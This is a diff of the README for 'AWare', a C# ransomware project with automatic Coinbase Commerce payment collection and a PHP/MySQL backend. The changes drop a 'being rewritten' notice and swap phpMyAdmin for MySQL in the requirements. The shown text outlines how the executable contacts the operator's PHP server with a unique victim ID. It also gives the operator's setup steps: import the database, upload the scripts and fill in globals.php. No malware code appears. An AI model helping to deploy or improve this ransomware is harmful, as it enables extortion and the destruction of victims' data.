@@ -1,4 +1,4 @@
-# AWare — C# Ransomware (Being rewritten!)
+# AWare — C# Ransomware
 
 Ransomware with automatic Coinbase Commerce integration created in C# (Console) and PHP
 
@@ -13,7 +13,7 @@ When the .EXE is opened, a request is sent to the PHP script, with a unique ID o
 ### Requirements
 - PHP 7.0 or Higher
 - Coinbase Commerce Account
-- phpMyAdmin
+- MySQL
 
 ### Usage
 Create a database and import the db.sql file, then upload the PHP scripts to your server, you need to open the globals.php file and fill in the following definitions:
